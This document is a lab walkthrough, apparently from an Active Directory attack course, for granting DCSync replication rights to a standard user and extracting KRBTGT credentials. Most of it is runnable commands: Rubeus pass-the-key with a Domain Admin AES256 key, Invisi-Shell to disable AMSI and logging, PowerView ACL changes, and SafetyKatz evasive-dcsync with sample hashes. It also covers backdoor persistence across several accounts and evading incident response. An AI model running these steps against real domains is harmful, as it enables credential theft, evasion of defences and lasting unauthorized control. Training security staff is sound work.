# Attack - DCSync Rights Abuse (Credential Replication)

**Date:** Friday, August 26, 2026
**Topic:** Granting & Abusing DCSync (Replication) Rights for Credential Extraction

---

## Objective

**Goal:** Grant DCSync rights to standard user account for credential extraction without DC access

**Progression:**
```
Check if studentx has DCSync rights
    ↓
If not, obtain Domain Admin privileges
    ↓
Grant DCSync rights to studentx
    ↓
Use DCSync to extract KRBTGT credentials
    ↓
Complete domain compromise via credential extraction
    ↓
No direct DC access needed for credential theft
```

---

## Prerequisites

- Standard domain user account (studentx)
- Domain Admin privileges (svcadmin with AES256 key)
- PowerView.ps1 tool
- SafetyKatz.exe tool
- Rubeus.exe tool
- Loader.exe tool
- Access to domain (network connectivity)
- Domain structure: DC=dollarcorp,DC=moneycorp,DC=local

---

## What is DCSync?

### Directory Replication (DCSync)

```
DCSync = Directory Replication Synchronization

What is it?
├─ Normal DC operation: DCs sync credentials
├─ Mechanism: Directory replication between DCs
├─ Purpose: Keep all DCs in sync
├─ Protocol: MS-DRSR (Directory Replication Service)
├─ Authentication: Kerberos (service account context)
└─ Permissions: Granted to DC$ and SYSTEM

How it works?
├─ DC1 contacts DC2: "Give me all user objects"
├─ DC2 checks: "Is this a DC?" (verify identity)
├─ DC2 checks: "Does caller have Replication rights?"
├─ If yes: "Here are all credentials (hashes, keys)"
├─ DC1 receives: All credential hashes
└─ Result: Synchronized credentials
```

---

### Why DCSync is Powerful for Attackers

```
✓ No Need for DC Access
  └─ Can run from any machine
  └─ No admin access required locally
  └─ Just domain membership

✓ Extract ANY Credential
  └─ KRBTGT hash (golden/diamond tickets)
  └─ Domain admin hashes
  └─ Service account hashes
  └─ Regular user hashes

✓ Silent Operation
  └─ No LSASS access needed
  └─ No process injection
  └─ No tool execution on DC
  └─ No files written

✓ Replication Rights Rare
  └─ Often granted incorrectly
  └─ Forgotten about in audits
  └─ Not checked in incident response
  └─ Perfect for persistence
```

---

## Phase 1: Check Current DCSync Rights

### List Current ACLs on Domain Root

**Start Invisi-Shell and check rights:**

```powershell
# Start Invisi-Shell (bypass logging)
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Load PowerView
. C:\AD\Tools\PowerView.ps1

# Check for replication-get rights (DCSync)
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" `
  -SearchScope Base `
  -ResolveGUIDs | `
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | `
  ForEach-Object {
    $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier)
    $_
  } | `
  ?{$_.IdentityName -match "studentx"}

# Parameters explained below
```

---

### Command Breakdown

**Get-DomainObjectAcl** — Query Access Control Lists

```
-SearchBase: "DC=dollarcorp,DC=moneycorp,DC=local"
├─ Start search at: Domain root
├─ Scope: Entire domain
└─ Purpose: Find ACLs on domain object

-SearchScope Base
├─ Base = Only search specified object
├─ Not sub-objects
├─ Only domain root ACL
└─ Purpose: Find DCSync rights on domain

-ResolveGUIDs
├─ Convert: GUID → Human-readable names
├─ Example: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} → Replication-Get
├─ Purpose: Readable output
└─ Required: To understand what rights
```

---

**Filtering for DCSync Rights**

```powershell
?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

ObjectAceType -match 'replication-get'
├─ Right: Replication-Get (explicit DCSync right)
├─ Used for: Direct replication operations
├─ GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
└─ What it does: Allows DS-Replication-Get-Changes

ActiveDirectoryRights -match 'GenericAll'
├─ Right: Generic All (super permission)
├─ Includes: All rights (including DCSync)
├─ Users/Groups: Should never have this
├─ Misconfiguration: Often granted by mistake
└─ What it does: Complete control over object
```

---

**Add Identity Name & Filter**

```powershell
ForEach-Object {
  $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier)
  $_
}

Purpose:
├─ Convert SID → Name
├─ Example: S-1-5-21-...-1005 → DCORP\studentx
├─ Makes output readable
└─ Can then filter by name

?{$_.IdentityName -match "studentx"}
├─ Filter: Show only studentx
├─ Result: All DCSync rights granted to studentx
└─ If empty: studentx doesn't have rights
```

---

### Possible Output (No Rights)

```powershell
# If studentx doesn't have DCSync rights
# Output: (empty - no results)

# Means: studentx cannot perform DCSync
# Next step: Grant DCSync rights (if we have DA)
```

---

### Possible Output (Has Rights)

```powershell
# If studentx has DCSync rights
# Output:

ObjectDN: DC=dollarcorp,DC=moneycorp,DC=local
IdentityName: DCORP\studentx
ObjectAceType: replication-get
ActiveDirectoryRights: ExtendedRight
SecurityIdentifier: S-1-5-21-719815819-3726368948-3917688648-1005

# Means: studentx can perform DCSync!
# No need to grant rights
# Can proceed to extraction
```

---

## Phase 2: Grant DCSync Rights (If Needed)

### Start Domain Admin Process

**Create DA-privileged shell:**

```powershell
# Run from elevated command prompt (Run as Administrator)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt `
  /user:svcadmin `
  /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 `
  /opsec `
  /createnetonly:C:\Windows\System32\cmd.exe `
  /show `
  /ppt

# Output:
# [+] TGT created for svcadmin (Domain Admin)
# [+] New cmd.exe process created with DA token
# [+] Ready for admin operations

# New cmd.exe window opens
# This process has Domain Admin privileges
```

---

### Start Invisi-Shell with Admin Rights

**Inside DA process, start Invisi-Shell:**

```powershell
# Start Invisi-Shell with admin rights
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat

# What this does:
# ├─ Disables AMSI (In-Memory Patching)
# ├─ Disables Script Block Logging (Enhanced Logging)
# ├─ Disables PowerShell Logging
# ├─ Runs as Administrator
# └─ Ready for privileged PowerView operations
```

---

**Why RunWithPathAsAdmin.bat?**
```
RunWithRegistryNonAdmin.bat:
├─ No admin required
├─ Limited to non-admin operations
├─ Good for enumeration

RunWithPathAsAdmin.bat:
├─ Admin required
├─ Can modify AD
├─ Can add ACLs
├─ Required for Add-DomainObjectAcl
└─ MUST use this for granting rights
```

---

### Load PowerView and Grant Rights

**Add DCSync rights to studentx:**

```powershell
# Load PowerView
. C:\AD\Tools\PowerView.ps1

# Add DCSync rights to studentx
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' `
  -PrincipalIdentity studentx `
  -Rights DCSync `
  -PrincipalDomain dollarcorp.moneycorp.local `
  -TargetDomain dollarcorp.moneycorp.local `
  -Verbose

# Output:
# [*] Adding DCSync rights...
# [+] Success: studentx granted DCSync rights
```

---

### Parameter Breakdown

**Add-DomainObjectAcl Parameters:**

| Parameter | Value | Purpose |
|---|---|---|
| `-TargetIdentity` | `DC=dollarcorp,DC=moneycorp,DC=local` | Domain root (what to modify) |
| `-PrincipalIdentity` | `studentx` | User to grant rights to |
| `-Rights` | `DCSync` | Right type (replication-get) |
| `-PrincipalDomain` | `dollarcorp.moneycorp.local` | studentx's domain |
| `-TargetDomain` | `dollarcorp.moneycorp.local` | Domain root's domain |
| `-Verbose` | Flag | Show detailed output |

---

**What Each Parameter Does:**

**`-TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local'`**
```
Object to modify:
├─ TargetIdentity = Domain root (CN=Directory Service, CN=Windows NT)
├─ This object controls DCSync rights
├─ We add ACE (Access Control Entry) to this
└─ Result: studentx gains replication rights
```

---

**`-PrincipalIdentity studentx`**
```
User to grant rights:
├─ studentx = Standard domain user
├─ Currently has: Regular user rights
├─ After modification: DCSync rights
├─ Can now: Replicate credentials from DC
└─ No DC access needed (domain user is enough)
```

---

**`-Rights DCSync`**
```
Permission type:
├─ DCSync = MS-DRSR replication right
├─ Includes: DS-Replication-Get-Changes
├─ Includes: DS-Replication-Get-Changes-All
├─ Full name: Replicate Directory Changes
└─ Allows: Extract user credentials
```

---

**`-PrincipalDomain / -TargetDomain`**
```
Domain context:
├─ Specifies: Which domain studentx is in
├─ Specifies: Which domain root to target
├─ Multi-domain: Can grant cross-domain
├─ Same domain: Both usually same
└─ Important: For forest-wide operations
```

---

### Verify Rights Were Granted

**Confirm studentx now has DCSync rights:**

```powershell
# Query again (same command as Phase 1)
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" `
  -SearchScope Base `
  -ResolveGUIDs | `
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | `
  ForEach-Object {
    $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier)
    $_
  } | `
  ?{$_.IdentityName -match "studentx"}

# Output (now should show):
# ObjectDN: DC=dollarcorp,DC=moneycorp,DC=local
# IdentityName: DCORP\studentx
# ObjectAceType: replication-get
# ActiveDirectoryRights: ExtendedRight

# SUCCESS! studentx now has DCSync rights
```

---

## Phase 3: Perform DCSync Attack

### Extract KRBTGT via DCSync

**Use studentx's new DCSync rights:**

```powershell
# Note: Can run from any machine (student VM)
# studentx credentials needed (or process token)
# Can be from non-elevated shell now!

# Execute SafetyKatz with DCSync
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe `
  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" `
  "exit"

# Parameters:
# lsadump::evasive-dcsync = DCSync in evasive mode
# /user:dcorp\krbtgt = Extract KRBTGT credentials
# exit = Close after completion

# Output:
# [*] Performing DCSync for: dcorp\krbtgt
# [+] Credentials extracted:
#     User: krbtgt
#     RID: 502
#     NTLM: 4e9815869d2090ccfca61c1fe0d23986
#     SHA1: [SHA1 hash]
#     AES256: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
#
# JACKPOT! KRBTGT credentials extracted!
```

---

### What DCSync Does Behind the Scenes

```
DCSYNC PROCESS:

1. AUTHENTICATION
   ├─ Use studentx's credentials
   ├─ Authenticate to DC via Kerberos
   ├─ DC checks: "Does studentx have DCSync rights?"
   ├─ Result: Yes (we just granted them!)
   └─ Status: Authentication successful

2. REQUEST
   ├─ Request: "Replicate user: krbtgt"
   ├─ Purpose: Directory synchronization
   ├─ Reason: "I need to sync credentials"
   ├─ Protocol: MS-DRSR (Directory Replication Service)
   └─ DC accepts: Legitimate replication request

3. CREDENTIAL EXTRACTION
   ├─ DC sends: krbtgt object
   ├─ Includes: All credential hashes
   ├─ Includes: NTLM, SHA1, AES256
   ├─ Includes: Kerberos keys
   └─ Result: Full credentials transmitted

4. HASH CAPTURE
   ├─ SafetyKatz receives: All hashes
   ├─ Display: NTLM and AES256
   ├─ Storage: Attacker now has credentials
   └─ Usage: Can create golden/diamond tickets

5. IMPACT
   ├─ KRBTGT hash = Golden Ticket capability
   ├─ Any user hash = Pass-the-Hash
   ├─ Domain Admin hashes = Full compromise
   └─ Result: Complete domain control
```

---

## Complete DCSync Rights Workflow

```
PHASE 1: Enumeration ✓
├─ Start Invisi-Shell
├─ Load PowerView
├─ Query domain ACLs
├─ Check if studentx has DCSync
└─ Result: Determines next action

PHASE 2: Grant Rights (if needed) ✓
├─ Create DA process (OverPass-the-Hash)
├─ Start Invisi-Shell with admin
├─ Load PowerView in admin context
├─ Use Add-DomainObjectAcl
├─ Grant DCSync to studentx
├─ Verify rights granted
└─ Result: studentx now has DCSync

PHASE 3: Perform DCSync ✓
├─ Use SafetyKatz with DCSync
├─ Extract krbtgt credentials
├─ Capture: NTLM and AES256 hashes
├─ Store: For future attacks
└─ Result: Full domain compromise achieved

RESULT: DCSync rights abused for credential extraction
        Standard user with DCSync = Super power
        KRBTGT extracted without DC access
        Golden tickets now possible
```

---

## Why Granting DCSync is Powerful

### From Attacker's Perspective

```
Before granting DCSync:
├─ studentx = standard user
├─ No special permissions
├─ Can't extract credentials
├─ Limited access
└─ Not useful for persistence

After granting DCSync:
├─ studentx = super user (effectively)
├─ Has replication rights
├─ Can extract ANY credential
├─ Full credential access
├─ Perfect for persistence
```

---

### Detection Challenges

```
What responders CAN detect:
✓ Add-DomainObjectAcl command
✓ ACL modification events (5136)
✓ PowerView loading
✓ Rubeus execution

What responders MIGHT MISS:
✗ One-time ACL grant (looks normal after)
✗ DCSync usage (looks like normal replication)
✗ Delayed DCSync (hours/days after ACL grant)
✗ DCSync from different machine
✗ Using different credentials (not original attacker)
```

---

## Advanced: Grant Multiple Users

### Grant DCSync to Multiple Accounts

```powershell
# Grant to multiple users (persistence backup)
$users = @("studentx", "svcadmin", "krbtgt")

foreach ($user in $users) {
  Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' `
    -PrincipalIdentity $user `
    -Rights DCSync `
    -PrincipalDomain dollarcorp.moneycorp.local `
    -TargetDomain dollarcorp.moneycorp.local `
    -Verbose
}

# Result: Multiple users with DCSync
# Impact: Any of them can extract credentials
# Persistence: Multiple backup options
```

---

## Advanced: Verify Rights on Multiple Users

```powershell
# Check all users with DCSync rights
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" `
  -SearchScope Base `
  -ResolveGUIDs | `
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | `
  ForEach-Object {
    $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier)
    $_
  }

# Output: All users/groups with DCSync
# Shows: Unexpected ACLs or misconfigurations
```

---

## Troubleshooting

### If Grant Fails (Permission Denied)

```
1. Not Domain Admin
   └─ Error: "Access Denied"
   └─ Fix: Use DA process (Rubeus asktgt)
   └─ Fix: Verify DA credentials

2. Wrong Invisi-Shell
   └─ Error: "Operation not permitted"
   └─ Fix: Use RunWithPathAsAdmin.bat (not NonAdmin)
   └─ Fix: Must be elevated

3. Wrong domain
   └─ Error: "Cannot find domain"
   └─ Fix: Verify domain name exact
   └─ Fix: Check network connectivity
```

---

### If DCSync Fails

```
1. studentx doesn't have rights
   └─ Error: "Access Denied" on replication
   └─ Fix: Verify rights granted (Phase 1)
   └─ Fix: Re-run Add-DomainObjectAcl

2. DC not reachable
   └─ Error: "Cannot contact DC"
   └─ Fix: Check network connectivity
   └─ Fix: Verify DC hostname/IP
   └─ Fix: Check firewall

3. User doesn't exist
   └─ Error: "User not found"
   └─ Fix: Use actual domain username
   └─ Fix: Example: dcorp\krbtgt (include domain)
```

---

## Complete Command Sequence

```powershell
# ========== PHASE 1: CHECK RIGHTS ==========

# Start Invisi-Shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Load PowerView
. C:\AD\Tools\PowerView.ps1

# Check if studentx has DCSync
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" `
  -SearchScope Base -ResolveGUIDs | `
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | `
  ForEach-Object {
    $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier)
    $_
  } | ?{$_.IdentityName -match "studentx"}

# If empty: studentx doesn't have rights → Proceed to Phase 2
# If results: studentx has rights → Skip to Phase 3

# ========== PHASE 2: GRANT RIGHTS (if needed) ==========

# Create DA process (from elevated cmd.exe)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt `
  /user:svcadmin `
  /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 `
  /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ppt

# Start admin Invisi-Shell (in new DA process)
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat

# Load PowerView
. C:\AD\Tools\PowerView.ps1

# Grant DCSync to studentx
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' `
  -PrincipalIdentity studentx `
  -Rights DCSync `
  -PrincipalDomain dollarcorp.moneycorp.local `
  -TargetDomain dollarcorp.moneycorp.local `
  -Verbose

# Verify rights granted
Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" `
  -SearchScope Base -ResolveGUIDs | `
  ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | `
  ForEach-Object {
    $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier)
    $_
  } | ?{$_.IdentityName -match "studentx"}

# ========== PHASE 3: PERFORM DCSYNC ==========

# Execute DCSync to extract KRBTGT
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe `
  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" `
  "exit"

# Copy output: KRBTGT NTLM and AES256 hashes
# Use for: Golden Tickets, Diamond Tickets, Persistence
```

---

## Key Takeaway

```
DCSYNC RIGHTS ABUSE:
1. Check if user has DCSync rights
2. If not, obtain DA privileges
3. Grant DCSync to target user (Add-DomainObjectAcl)
4. Use DCSync to extract ANY credential
5. Result: Full domain compromise without DC access

Why powerful:
- Standard user with DCSync = Super power
- Can extract KRBTGT, Domain Admin, Service Account hashes
- No need for Direct DC access
- No need for LSASS dumping
- No file execution on DC
- Silent operation

Persistence value:
- DCSync rights often overlooked
- Can be granted and forgotten
- Later used for credential extraction
- Perfect backup plan if other access lost
- Independent of password resets

Attack timeline:
Weeks 1-2: Penetration, obtain DA
Week 3: Grant DCSync to studentx
Week 4-8: Incident response, reset passwords
Week 9: Attacker returns via studentx's DCSync rights
Week 10+: Still extracting credentials, full access
```

---

## References

- [PowerView DCSync](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [SafetyKatz - DCSync](https://github.com/GhostPack/SafetyKatz)
- [Mimikatz lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [MS-DRSR Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-674e-4155-b003-df541e8978e6)
- [Directory Replication](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started-with-active-directory-domain-services--ad-ds--installation-and-removal-on-windows-server-2016)

---

*Next: Cleanup & Log Deletion*
